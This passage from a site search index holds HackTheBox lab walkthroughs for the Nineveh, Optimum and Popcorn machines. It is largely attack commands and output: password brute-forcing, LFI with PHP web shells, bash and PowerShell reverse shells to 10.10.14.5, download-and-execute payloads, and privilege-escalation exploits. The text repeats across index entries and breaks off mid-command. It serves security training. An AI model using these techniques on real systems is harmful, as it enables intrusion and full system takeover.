0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:443 0.0.0.0:* LISTEN - <snip> Port 22 is openning in the server, but iptables allow only port 80 and 443. www-data@nineveh:/tmp$ cat /etc/iptables/rules.v4 <snip> -A INPUT -p icmp -j ACCEPT -A INPUT -i lo -j ACCEPT -A INPUT -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT -A INPUT -p tcp -m tcp --dport 80 -j ACCEPT -A INPUT -p tcp -m tcp --dport 443 -j ACCEPT -A INPUT -j DROP COMMIT # Completed on Sun Jul 2 19:37:15 2017 Using command find to find knockd file config. www-data@nineveh:/etc$ find / -name *knockd* 2>/dev/null find / -name *knockd* 2>/dev/null /etc/knockd.conf www-data@nineveh:/etc$ cat /etc/knockd.conf cat /etc/knockd.conf [options] logfile = /var/log/knockd.log interface = ens160 [openSSH] sequence = 571, 290, 911 seq_timeout = 5 start_command = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT tcpflags = syn [closeSSH] sequence = 911,290,571 seq_timeout = 5 start_command = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT tcpflags = syn Let's knock number of port to make iptables allow port 22. \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[2.6:24.9]~ \u2514\u2500$ knock 10.10.10.43 571 290 911 Using nmap checking port 22 is open. \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[2.6:25.8]~ \u2514\u2500$ nmap -p 22 10.10.10.43 <snip> PORT STATE SERVICE 22/tcp open ssh Nmap done: 1 IP address (1 host up) scanned in 0.63 seconds Using private key to ssh to the server. \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[2.6:25.5]~/walkthrough/hackthebox/nineveh \u2514\u2500$ ssh -i nineveh.priv amrois@10.10.10.43 <snip> You have mail. Last login: Mon Jul 3 00:19:59 2017 from 192.168.0.14 amrois@nineveh:~$ id uid=1000(amrois) gid=1000(amrois) groups=1000(amrois)","title":"HTB Nineveh"},{"location":"walkthrough/hackthebox/Nineveh/index.html#hackthebox-nineveh","text":"Author: Hades Scripting here","title":"HackTheBox Nineveh"},{"location":"walkthrough/hackthebox/Nineveh/index.html#information-gathering","text":"","title":"Information Gathering"},{"location":"walkthrough/hackthebox/Nineveh/index.html#openning-services","text":"### Port Scanning ############################ nmap -sS -p- --min-rate 1000 10.10.10.43 [+] Openning ports: 80,443 ### Services Enumeration ############################ nmap -sC -sV -Pn 10.10.10.43 -p80,443 Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-05 12:44 +07 Nmap scan report for 10.10.10.43 Host is up (0.28s latency). PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Site doesn't have a title (text/html). 443/tcp open ssl/http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Site doesn't have a title (text/html). | ssl-cert: Subject: commonName=nineveh.htb/organizationName=HackTheBox Ltd/stateOrProvinceName=Athens/countryName=GR | Not valid before: 2017-07-01T15:03:30 |_Not valid after: 2018-07-01T15:03:30 |_ssl-date: TLS randomness does not represent time | tls-alpn: |_ http/1.1 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 29.22 seconds","title":"Openning Services"},{"location":"walkthrough/hackthebox/Nineveh/index.html#web-application-80","text":"It is a default web page. List of the hidden in the server using gobuster . ### Web Enumeration (80) ############################ +] Files and directories gobuster dir -k -u http://10.10.10.43:80 -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt <snip> =============================================================== /department (Status: 301) [Size: 315] [--> http://10.10.10.43/department/] Login page at /department . I enum more hidden file in uri /department but there are no interested file. Try to brute force username password with hydra using rockyou.txt directory. \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[1.9:26.2]~/scripting \u2514\u2500$ hydra -l admin -P /home/kali/directory/rockyou.txt 10.10.10.43 http-post-form '/department/login.php:username=admin&password=^PASS^:Invalid Password!' <snip> [80][http-post-form] host: 10.10.10.43 login: admin password: 1q2w3e4r5t After login to department with admin:1q2w3e4r5t , I have a note at the url http://nineveh.htb/department/manage.php?notes=files/ninevehNotes.txt","title":"Web Application 80"},{"location":"walkthrough/hackthebox/Nineveh/index.html#web-application-443","text":"Fist in the web, I saw an image here. Based on nmap result, port 443 have domain commonName=nineveh.htb . I add it to /etc/host and go to this site again, but it return the same page. Using gobuster to list hidden in the website, I have uri /db . [+] Files and directories gobuster dir -k -u https://10.10.10.43:443 -w /usr/share/seclists/Discovery/Web-Content/common.txt <snip> =============================================================== /.hta (Status: 403) [Size: 291] /.htaccess (Status: 403) [Size: 296] /.htpasswd (Status: 403) [Size: 296] /db (Status: 301) [Size: 309] [--> https://10.10.10.43/db/] phpLiteAdmin 1.9 at /db . Try to brute force phpLiteAdmin password with hydra using rockyou.txt directory. \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[1.9:32.3]~ \u2514\u2500$ hydra -l admin -P /home/kali/directory/rockyou.txt 10.10.10.43 https-post-form '/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password.' <snip> [443][http-post-form] host: 10.10.10.43 login: admin password: password123 Search the public exploit with searchsploit . \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[1.9:25.1]~/scripting \u2514\u2500$ searchsploit phpLiteAdmin 1.9 -------------------------------------------- --------------------------------- Exploit Title | Path -------------------------------------------- --------------------------------- PHPLiteAdmin 1.9.3 - Remote PHP Code Inject | php/webapps/24044.txt phpLiteAdmin 1.9.6 - Multiple Vulnerabiliti | php/webapps/39714.txt -------------------------------------------- --------------------------------- Shellcodes: No Results","title":"Web Application 443"},{"location":"walkthrough/hackthebox/Nineveh/index.html#foothold","text":"","title":"Foothold"},{"location":"walkthrough/hackthebox/Nineveh/index.html#lfi-within-filtering","text":"Poc code here At url http://nineveh.htb/department/manage.php?notes=files/ninevehNotes.txt , I saw this url query ninevehNotes.txt file, try to check it with Local file inclusion. With only enough /../ in the url and content file name ninevehNotes , the LFI vulnerability will work. Try read some other sensitive file, I got the result File name too long. . We need have a backdoor with the length long enough. The file name must contain name ninevehNotes .","title":"LFI within filtering"},{"location":"walkthrough/hackthebox/Nineveh/index.html#php-code-injection","text":"Using exploit at php/webapps/24044.txt , I create 1 database named ninevehNotes.php . Create new table name <?php system($_REQUEST['cmd'])?> . The database at /var/tmp/ninevehNotes.php contain php execute code have been created. Now I have a backdoor ninevehNotes.php .","title":"PHP Code Injection"},{"location":"walkthrough/hackthebox/Nineveh/index.html#php-backdoor","text":"Back to LFI vulnerability, I execute the backdoor with command id to confirm it. http://nineveh.htb/department/manage.php?notes=../../../../../var/tmp/ninevehNotes.php&cmd=id Step to gain reverse shell. Url encode using hURL \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[2.0:28.4]~ \u2514\u2500$ hURL -U \"bash -c 'bash -i >& /dev/tcp/10.10.14.5/443 0>&1'\" Original :: bash -c 'bash -i >& /dev/tcp/10.10.14.5/443 0>&1' URL ENcoded :: bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.5%2F443%200%3E%261%27 Execute bash reverse shell at backdoor ninevehNotes.php \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[2.0:28.4]~ \u2514\u2500$ cmd='bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.5%2F443%200%3E%261%27' \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[2.0:28.3]~ \u2514\u2500$ curl --silent --cookie \"PHPSESSID=qe89kahpkithaplfechcptbjt5\" \"http://nineveh.htb/department/manage.php?notes=../../../../../var/tmp/ninevehNotes.php&cmd=$cmd\" > /dev/null Reverse shell at listener. \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[2.0:28.4]~ \u2514\u2500$ sudo nc -nvlp 443 listening on [any] 443 ... connect to [10.10.14.5] from (UNKNOWN) [10.10.10.43] 37498 bash: cannot set terminal process group (1390): Inappropriate ioctl for device bash: no job control in this shell www-data@nineveh:/var/www/html/department$ id id uid=33(www-data) gid=33(www-data) groups=33(www-data) www-data@nineveh:/var/www/html/department$","title":"PHP Backdoor"},{"location":"walkthrough/hackthebox/Nineveh/index.html#privilege-escalation","text":"","title":"Privilege Escalation"},{"location":"walkthrough/hackthebox/Nineveh/index.html#chkrootkit-file-overwrite","text":"Poc code here I use script procmon.sh to check the scheduled tasks in the system. www-data@nineveh:/tmp$ bash procmon.sh < sleep 1 > sleep 1 > /usr/sbin/CRON -f > /bin/sh -c /root/vulnScan.sh > /bin/bash /root/vulnScan.sh > /bin/sh /usr/bin/chkrootkit > find /lib /usr/lib /usr/local/lib -name libproc.a There are command chkrootkit may have the vulnerable, find public exploit using searchsploit . \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[2.5:27.0]~ \u2514\u2500$ searchsploit chkrootkit ------------------------------------------------------ --------------------------------- Exploit Title | Path ------------------------------------------------------ --------------------------------- Chkrootkit - Local Privilege Escalation (Metasploit) | linux/local/38775.rb Chkrootkit 0.49 - Local Privilege Escalation | linux/local/33899.txt ------------------------------------------------------ --------------------------------- Shellcodes: No Results Follow exploit linux/local/33899.txt , I create reverse bash shell in file /tmp/update and add execute permission. echo \"bash -c 'bash -i >& /dev/tcp/10.10.14.5/443 0>&1'\" > /tmp/update; chmod +x /tmp/update At the listener, I have root shell. \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[2.6:25.5]~ \u2514\u2500$ sudo nc -nvlp 443 listening on [any] 443 ... connect to [10.10.14.5] from (UNKNOWN) [10.10.10.43] 56490 bash: cannot set terminal process group (27001): Inappropriate ioctl for device bash: no job control in this shell root@nineveh:~# whoami whoami root","title":"Chkrootkit File overwrite"},{"location":"walkthrough/hackthebox/Nineveh/index.html#steganography-and-knockd","text":"Poc code here Follow note check your serect folder to get in! figure it out! this is your challenge and check out www folder, I saw ssl folder. www-data@nineveh:/var/www$ ls cd html ssl Go to ssl and there is an secure_notes contain image nineveh.png . www-data@nineveh:/var/www/ssl$ ls secure_notes/ index.html nineveh.png www-data@nineveh:/var/www/ssl$ ls /home amrois May admin used some steganography to hidden text and challenge user amrois to figure it out. I download image nineveh.png and using strings to list text on it. \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[2.2:31.2]~/walkthrough/hackthebox/nineveh \u2514\u2500$ strings nineveh.png www-data secret/nineveh.priv -----BEGIN RSA PRIVATE KEY----- MIIEowIBAAKCAQEAri9EUD7bwqbmEsEpIeTr2KGP/wk8YAR0Z4mmvHNJ3UfsAhpI <snip> Now, I have the private key, but at the openning services scanned when I gather infomation, port 22 is not open. Let's have a local enum opening ports. www-data@nineveh:/tmp$ netstat -antup <snip> Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 0.0.0.0:80 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:443 0.0.0.0:* LISTEN - <snip> Port 22 is openning in the server, but iptables allow only port 80 and 443. www-data@nineveh:/tmp$ cat /etc/iptables/rules.v4 <snip> -A INPUT -p icmp -j ACCEPT -A INPUT -i lo -j ACCEPT -A INPUT -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT -A INPUT -p tcp -m tcp --dport 80 -j ACCEPT -A INPUT -p tcp -m tcp --dport 443 -j ACCEPT -A INPUT -j DROP COMMIT # Completed on Sun Jul 2 19:37:15 2017 Using command find to find knockd file config. www-data@nineveh:/etc$ find / -name *knockd* 2>/dev/null find / -name *knockd* 2>/dev/null /etc/knockd.conf www-data@nineveh:/etc$ cat /etc/knockd.conf cat /etc/knockd.conf [options] logfile = /var/log/knockd.log interface = ens160 [openSSH] sequence = 571, 290, 911 seq_timeout = 5 start_command = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT tcpflags = syn [closeSSH] sequence = 911,290,571 seq_timeout = 5 start_command = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT tcpflags = syn Let's knock number of port to make iptables allow port 22. \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[2.6:24.9]~ \u2514\u2500$ knock 10.10.10.43 571 290 911 Using nmap checking port 22 is open. \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[2.6:25.8]~ \u2514\u2500$ nmap -p 22 10.10.10.43 <snip> PORT STATE SERVICE 22/tcp open ssh Nmap done: 1 IP address (1 host up) scanned in 0.63 seconds Using private key to ssh to the server. \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[2.6:25.5]~/walkthrough/hackthebox/nineveh \u2514\u2500$ ssh -i nineveh.priv amrois@10.10.10.43 <snip> You have mail. Last login: Mon Jul 3 00:19:59 2017 from 192.168.0.14 amrois@nineveh:~$ id uid=1000(amrois) gid=1000(amrois) groups=1000(amrois)","title":"Steganography and Knockd"},{"location":"walkthrough/hackthebox/Optimum/index.html","text":"HackTheBox Optimum Author: Hades Scripting here Information Gathering Openning Services \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[1.3:22.4]~/scripting \u2514\u2500$ sudo ./enum/all.sh 10.10.10.8 [sudo] password for kali: ### Port Scanning ############################ nmap -sS -p- --min-rate 1000 10.10.10.8 | grep ^[0-9] | cut -d '/' -f1 | tr '\\n' ',' | sed s/,$// [+] Openning ports: 80 ### Services Enumeration ############################ nmap -sC -sV -Pn 10.10.10.8 -p80 Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-02 23:47 +07 Nmap scan report for 10.10.10.8 Host is up (0.23s latency). PORT STATE SERVICE VERSION 80/tcp open http HttpFileServer httpd 2.3 |_http-server-header: HFS 2.3 |_http-title: HFS / Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 26.21 seconds HttpFileServer httpd 2.3 Search exploits with searchsploit \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[1.5:20.3]~ \u2514\u2500$ searchsploit HttpFileServer 2.3 ------------------------------------------------- --------------------------------- Exploit Title | Path ------------------------------------------------- --------------------------------- Rejetto HttpFileServer 2.3.x - Remote Command Ex | windows/webapps/49125.py ------------------------------------------------- --------------------------------- Shellcodes: No Results Foothold HttpFileServer RCE Poc code here Using exploit windows/webapps/49125.py , I try to execute it to sent ping command cmd.exe /c ping 10.10.14.5 and monitor icmp using tcpdump . \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[1.5:20.7]~/walkthrough/hackthebox/optimum \u2514\u2500$ python3 49125.py 10.10.10.8 80 \"cmd.exe /c ping 10.10.14.5\" http://10.10.10.8:80/?search=%00{.+exec|cmd.exe%20/c%20ping%2010.10.14.5.} \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[1.5:20.5]~ \u2514\u2500$ sudo tcpdump -i tun0 icmp tcpdump: verbose output suppressed, use -v[v]... for full protocol decode listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes 00:00:27.674206 IP 10.10.10.8 > 10.10.14.5: ICMP echo request, id 1, seq 1, length 40 00:00:27.674272 IP 10.10.14.5 > 10.10.10.8: ICMP echo reply, id 1, seq 1, length 40 <snip> PowerShell Reverse Shell Poc code here Using powercat.ps1 to create ps file reverse shell. \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[0.1:13.9]~/walkthrough/hackthebox/optimum \u2514\u2500$ pwsh PowerShell 7.1.2 <snip> PS /<snip> . ./powercat.ps1 PS /<snip> powercat -c 10.10.14.5 -p 443 -e cmd.exe -g > shell.ps1 At kali machine, create a http server and a listener. \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[0.1:14.7]~/walkthrough/hackthebox/optimum \u2514\u2500$ sudo python3 -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... 10.10.10.8 - - [04/Apr/2021 21:15:52] \"GET /shell.ps1 HTTP/1.1\" 200 - 10.10.10.8 - - [04/Apr/2021 21:15:52] \"GET /shell.ps1 HTTP/1.1\" 200 - \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[0.1:14.8]~ \u2514\u2500$ sudo nc -nvlp 443 listening on [any] 443 ... connect to [10.10.14.5] from (UNKNOWN) [10.10.10.8] 49170 Microsoft Windows [Version 6.3.9600] (c) 2013 Microsoft Corporation. All rights reserved. C:\\Users\\kostas\\Desktop> Last step, execute payload with python3. \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[0.1:14.8]~/walkthrough/hackthebox/optimum \u2514\u2500$ cmd=\"powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://10.10.14.5/shell.ps1')\" \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[0.1:14.8]~/walkthrough/hackthebox/optimum \u2514\u2500$ python3 49125.py 10.10.10.8 80 \"$cmd\" http://10.10.10.8:80/?search=%00{.+exec|powershell.exe%20IEX%20%28New-Object%20System.Net.WebClient%29.DownloadString%28%27http%3A//10.10.14.5/shell.ps1%27%29.} Privilege Escalation RGNOBJ Integer Overflow Poc code here C:\\Users\\kostas\\Desktop>systeminfo systeminfo Host Name: OPTIMUM OS Name: Microsoft Windows Server 2012 R2 Standard OS Version: 6.3.9600 N/A Build 9600 <snip> System Type: x64-based <snip> I copy the result of systeminfo to file win-server-2012-6.3.9600.txt and check it using windows-exploit-suggester.py \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[0.1:13.5]~/priescal/Windows-Exploit-Suggester \u2514\u2500$ python windows-exploit-suggester.py --database 2021-04-03-mssb.xls --systeminfo ~/walkthrough/hackthebox/optimum/win-server-2012-6.3.9600.txt <snip> [E] MS16-135: Security Update for Windows Kernel-Mode Drivers (3199135) - Important [*] https://www.exploit-db.com/exploits/40745/ -- Microsoft Windows Kernel - win32k Denial of Service (MS16-135) [*] https://www.exploit-db.com/exploits/41015/ -- Microsoft Windows Kernel - 'win32k.sys' 'NtSetWindowLongPtr' Privilege Escalation (MS16-135) (2) [*] https://github.com/tinysec/public/tree/master/CVE-2016-7255 [*] [E] MS16-098: Security Update for Windows Kernel-Mode Drivers (3178466) - Important [*] https://www.exploit-db.com/exploits/41020/ -- Microsoft Windows 8.1 (x64) - RGNOBJ Integer Overflow (MS16-098) <snip> [*] done Because it is Windows x64, I using MS16-098 vulnerability. Download binary file with wget . wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/41020.exe Download file 41020.exe to windows Server using power shell and execute it. powershell -c \"(new-object System.Net.WebClient).DownloadFile('http://10.10.14.5/41020.exe','C:\\Users\\kostas\\Desktop\\41020.exe')\" C:\\Users\\kostas\\Desktop>41020.exe 41020.exe Microsoft Windows [Version 6.3.9600] (c) 2013 Microsoft Corporation. All rights reserved. C:\\Users\\kostas\\Desktop>whoami whoami nt authority\\system C:\\Users\\kostas\\Desktop>","title":"HTB Optimum"},{"location":"walkthrough/hackthebox/Optimum/index.html#hackthebox-optimum","text":"Author: Hades Scripting here","title":"HackTheBox Optimum"},{"location":"walkthrough/hackthebox/Optimum/index.html#information-gathering","text":"","title":"Information Gathering"},{"location":"walkthrough/hackthebox/Optimum/index.html#openning-services","text":"\u250c\u2500\u2500(Hades\u327f10.10.14.5)-[1.3:22.4]~/scripting \u2514\u2500$ sudo ./enum/all.sh 10.10.10.8 [sudo] password for kali: ### Port Scanning ############################ nmap -sS -p- --min-rate 1000 10.10.10.8 | grep ^[0-9] | cut -d '/' -f1 | tr '\\n' ',' | sed s/,$// [+] Openning ports: 80 ### Services Enumeration ############################ nmap -sC -sV -Pn 10.10.10.8 -p80 Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-02 23:47 +07 Nmap scan report for 10.10.10.8 Host is up (0.23s latency). PORT STATE SERVICE VERSION 80/tcp open http HttpFileServer httpd 2.3 |_http-server-header: HFS 2.3 |_http-title: HFS / Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 26.21 seconds","title":"Openning Services"},{"location":"walkthrough/hackthebox/Optimum/index.html#httpfileserver-httpd-23","text":"Search exploits with searchsploit \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[1.5:20.3]~ \u2514\u2500$ searchsploit HttpFileServer 2.3 ------------------------------------------------- --------------------------------- Exploit Title | Path ------------------------------------------------- --------------------------------- Rejetto HttpFileServer 2.3.x - Remote Command Ex | windows/webapps/49125.py ------------------------------------------------- --------------------------------- Shellcodes: No Results","title":"HttpFileServer httpd 2.3"},{"location":"walkthrough/hackthebox/Optimum/index.html#foothold","text":"","title":"Foothold"},{"location":"walkthrough/hackthebox/Optimum/index.html#httpfileserver-rce","text":"Poc code here Using exploit windows/webapps/49125.py , I try to execute it to sent ping command cmd.exe /c ping 10.10.14.5 and monitor icmp using tcpdump . \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[1.5:20.7]~/walkthrough/hackthebox/optimum \u2514\u2500$ python3 49125.py 10.10.10.8 80 \"cmd.exe /c ping 10.10.14.5\" http://10.10.10.8:80/?search=%00{.+exec|cmd.exe%20/c%20ping%2010.10.14.5.} \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[1.5:20.5]~ \u2514\u2500$ sudo tcpdump -i tun0 icmp tcpdump: verbose output suppressed, use -v[v]... for full protocol decode listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes 00:00:27.674206 IP 10.10.10.8 > 10.10.14.5: ICMP echo request, id 1, seq 1, length 40 00:00:27.674272 IP 10.10.14.5 > 10.10.10.8: ICMP echo reply, id 1, seq 1, length 40 <snip>","title":"HttpFileServer RCE"},{"location":"walkthrough/hackthebox/Optimum/index.html#powershell-reverse-shell","text":"Poc code here Using powercat.ps1 to create ps file reverse shell. \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[0.1:13.9]~/walkthrough/hackthebox/optimum \u2514\u2500$ pwsh PowerShell 7.1.2 <snip> PS /<snip> . ./powercat.ps1 PS /<snip> powercat -c 10.10.14.5 -p 443 -e cmd.exe -g > shell.ps1 At kali machine, create a http server and a listener. \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[0.1:14.7]~/walkthrough/hackthebox/optimum \u2514\u2500$ sudo python3 -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... 10.10.10.8 - - [04/Apr/2021 21:15:52] \"GET /shell.ps1 HTTP/1.1\" 200 - 10.10.10.8 - - [04/Apr/2021 21:15:52] \"GET /shell.ps1 HTTP/1.1\" 200 - \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[0.1:14.8]~ \u2514\u2500$ sudo nc -nvlp 443 listening on [any] 443 ... connect to [10.10.14.5] from (UNKNOWN) [10.10.10.8] 49170 Microsoft Windows [Version 6.3.9600] (c) 2013 Microsoft Corporation. All rights reserved. C:\\Users\\kostas\\Desktop> Last step, execute payload with python3. \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[0.1:14.8]~/walkthrough/hackthebox/optimum \u2514\u2500$ cmd=\"powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://10.10.14.5/shell.ps1')\" \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[0.1:14.8]~/walkthrough/hackthebox/optimum \u2514\u2500$ python3 49125.py 10.10.10.8 80 \"$cmd\" http://10.10.10.8:80/?search=%00{.+exec|powershell.exe%20IEX%20%28New-Object%20System.Net.WebClient%29.DownloadString%28%27http%3A//10.10.14.5/shell.ps1%27%29.}","title":"PowerShell Reverse Shell"},{"location":"walkthrough/hackthebox/Optimum/index.html#privilege-escalation","text":"","title":"Privilege Escalation"},{"location":"walkthrough/hackthebox/Optimum/index.html#rgnobj-integer-overflow","text":"Poc code here C:\\Users\\kostas\\Desktop>systeminfo systeminfo Host Name: OPTIMUM OS Name: Microsoft Windows Server 2012 R2 Standard OS Version: 6.3.9600 N/A Build 9600 <snip> System Type: x64-based <snip> I copy the result of systeminfo to file win-server-2012-6.3.9600.txt and check it using windows-exploit-suggester.py \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[0.1:13.5]~/priescal/Windows-Exploit-Suggester \u2514\u2500$ python windows-exploit-suggester.py --database 2021-04-03-mssb.xls --systeminfo ~/walkthrough/hackthebox/optimum/win-server-2012-6.3.9600.txt <snip> [E] MS16-135: Security Update for Windows Kernel-Mode Drivers (3199135) - Important [*] https://www.exploit-db.com/exploits/40745/ -- Microsoft Windows Kernel - win32k Denial of Service (MS16-135) [*] https://www.exploit-db.com/exploits/41015/ -- Microsoft Windows Kernel - 'win32k.sys' 'NtSetWindowLongPtr' Privilege Escalation (MS16-135) (2) [*] https://github.com/tinysec/public/tree/master/CVE-2016-7255 [*] [E] MS16-098: Security Update for Windows Kernel-Mode Drivers (3178466) - Important [*] https://www.exploit-db.com/exploits/41020/ -- Microsoft Windows 8.1 (x64) - RGNOBJ Integer Overflow (MS16-098) <snip> [*] done Because it is Windows x64, I using MS16-098 vulnerability. Download binary file with wget . wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/41020.exe Download file 41020.exe to windows Server using power shell and execute it. powershell -c \"(new-object System.Net.WebClient).DownloadFile('http://10.10.14.5/41020.exe','C:\\Users\\kostas\\Desktop\\41020.exe')\" C:\\Users\\kostas\\Desktop>41020.exe 41020.exe Microsoft Windows [Version 6.3.9600] (c) 2013 Microsoft Corporation. All rights reserved. C:\\Users\\kostas\\Desktop>whoami whoami nt authority\\system C:\\Users\\kostas\\Desktop>","title":"RGNOBJ Integer Overflow"},{"location":"walkthrough/hackthebox/Popcorn/index.html","text":"HackTheBox Popcorn Author: Hades Scripting here Information Gathering Openning Services \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[0.8:25.5]~/scripting \u2514\u2500$ sudo ./enum/all.sh 10.10.10.6 [sudo] password for kali: ### Port Scanning ############################ nmap -sS -p- --min-rate 1000 10.10.10.6 | grep ^[0-9] | cut -d '/' -f1 | tr '\\n' ',' | sed s/,$// [+] Openning ports: 22,80 ### Services Enumeration ############################ nmap -sC -sV -Pn 10.10.10.6 -p22,80 Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-01 05:15 EDT Nmap scan report for 10.10.10.6 Host is up (0.25s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 5.1p1 Debian 6ubuntu2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 1024 3e:c8:1b:15:21:15:50:ec:6e:63:bc:c5:6b:80:7b:38 (DSA) |_ 2048 aa:1f:79:21:b8:42:f4:8a:38:bd:b8:05:ef:1a:07:4d (RSA) 80/tcp open http Apache httpd 2.2.12 ((Ubuntu)) |_http-server-header: Apache/2.2.12 (Ubuntu) |_http-title: Site doesn't have a title (text/html). Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 15.14 seconds Apache httpd 2.2.12 List of the hidden with gobuster, I saw a special uri torrent which is Torrent Hoster. ### Web Enumeration (80) ############################ [+] Files and directories gobuster dir -k -u http://10.10.10.6:80 -w /usr/share/seclists/Discovery/Web-Content/common.txt <snip> =============================================================== /.hta (Status: 403) [Size: 282] /.htaccess (Status: 403) [Size: 287] /.htpasswd (Status: 403) [Size: 287] /cgi-bin/ (Status: 403) [Size: 286] /index (Status: 200) [Size: 177] /index.html (Status: 200) [Size: 177] /test (Status: 200) [Size: 47041] /torrent (Status: 301) [Size: 310] [--> http://10.10.10.6/torrent/] <snip> Torrent Hoster Torrent Hoster hosted at http://10.10.10.6/torrent/ . At http://10.10.10.6/torrent/users/index.php?mode=register , I sign up an account user:user and login. Using searsploit to find some exploits for Torrent hoster \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[5.0:20.9]~ \u2514\u2500$ searchsploit torrent hoster ------------------------------------ --------------------------------- Exploit Title | Path ------------------------------------ --------------------------------- Torrent Hoster - Remount Upload | php/webapps/11746.txt ------------------------------------ --------------------------------- Shellcodes: No Results Try to using the web application, I download a torrent file, example kali-linux-2021.1-installer-amd64.iso.torrent and upload it to Torrent Hoster at http://10.10.10.6/torrent/torrents.php?mode=upload wget https://images.kali.org/kali-linux-2021.1-installer-amd64.iso.torrent At http://10.10.10.6/torrent/torrents.php?mode=details&id=8509e36e3f62457bb3e33d07cd9a2440b83aa9fd check Edit this torrent and view another page to update the torrent. In there, I can upload an image to Update Screenshot . At 10.10.10.6/torrent/edit.php?mode=edit&id=8509e36e3f62457bb3e33d07cd9a2440b83aa9fd , I download an image and update the screenshot File successfully uploaded Foothold File Upload Bypass Poc code here File Upload Bypass Techniques Using exploit php/webapps/11746.txt and gain the foothold in the server. At the infor gathering, there are 2 way to upload file which are upload torrent file and upload screenshot file. At upload screenshot file , I try to upload a normal image and intercept the request with Burp Suite. Change the content in the image to <?php system($_GET['cmd']); ?> and change the file name extension to bymeacoffee.jpg.php Back to torrent file in the server and get the location of the backdoor. It is http://10.10.10.6/torrent/thumbnail.php?gd=2&src=./upload/8509e36e3f62457bb3e33d07cd9a2440b83aa9fd.php&maxw=96 . Follow the url, I can access to the upload folder at http://10.10.10.6/torrent/upload/ Gain Reverse Shell Poc code here Execute the backdoor and get reverse shell. \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[7.1:42.6]~/walkthrough/hackthebox/popcorn \u2514\u2500$ curl 'http://10.10.10.6/torrent/upload/8509e36e3f62457bb3e33d07cd9a2440b83aa9fd.php?cmd=id' uid=33(www-data) gid=33(www-data) groups=33(www-data) Url encode payload with hURL \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[6.8:42.7]~ \u2514\u2500$ hURL -U 'nc -nv 